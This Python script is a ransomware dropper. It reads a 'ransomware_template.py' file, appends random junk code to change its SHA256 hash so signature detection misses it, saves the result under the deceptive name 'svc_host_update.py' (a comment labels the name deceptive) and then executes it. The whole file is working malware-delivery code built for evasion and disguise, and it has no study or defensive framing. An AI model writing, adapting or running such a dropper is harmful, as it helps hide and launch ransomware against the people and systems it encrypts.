import os
import hashlib
import random
import string
import subprocess
import time

# --- CONFIGURATION ---
TEMPLATE_FILE = "ransomware_template.py"
OUTPUT_PAYLOAD = "svc_host_update.py" # Deceptive name
# ---------------------

def calculate_hash(file_path):
    """Calculates SHA256 hash of a file."""
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def generate_junk_code():
    """Generates random benign python code (variables and comments)."""
    var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    value = random.randint(1000, 9999)
    comment = ''.join(random.choices(string.ascii_letters + " ", k=20))
    
    junk = f"\n# {comment}\n"
    junk += f"{var_name} = {value}\n"
    junk += f"print('System Check: {var_name} OK') # Polymorphic artifact\n"
    return junk

def polymorphic_build():
    print("[*] Starting Dropper / Polymorphic Engine...")
    
    if not os.path.exists(TEMPLATE_FILE):
        print(f"[-] Error: Template file '{TEMPLATE_FILE}' not found!")
        return False

    # 1. Read the clean template
    with open(TEMPLATE_FILE, "r") as f:
        content = f.read()
        
    print(f"[*] Template Hash (Before): {hashlib.sha256(content.encode()).hexdigest()}")
    
    # 2. Inject Junk Code (Polymorphism)
    print("[*] Injecting polymorphic junk code...")
    junk = generate_junk_code()
    new_content = content + "\n\n" + junk
    
    # 3. Write to the executable payload file
    with open(OUTPUT_PAYLOAD, "w") as f:
        f.write(new_content)
        
    new_hash = calculate_hash(OUTPUT_PAYLOAD)
    print(f"[+] Built new payload: {OUTPUT_PAYLOAD}")
    print(f"[+] New Hash (After):   {new_hash}")
    
    return True

def execute_payload():
    print(f"\n[*] Executing Payload: {OUTPUT_PAYLOAD} ...")
    time.sleep(1)
    
    try:
        # Run the new python script
        subprocess.run(["python", OUTPUT_PAYLOAD], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Execution failed: {e}")
    except FileNotFoundError:
        print("[-] 'python' command not found. Ensure Python is in your PATH.")

def main():
    print("=== DROPPER STARTED ===")
    if polymorphic_build():
        execute_payload()
    print("=== DROPPER FINISHED ===")

if __name__ == "__main__":
    main()
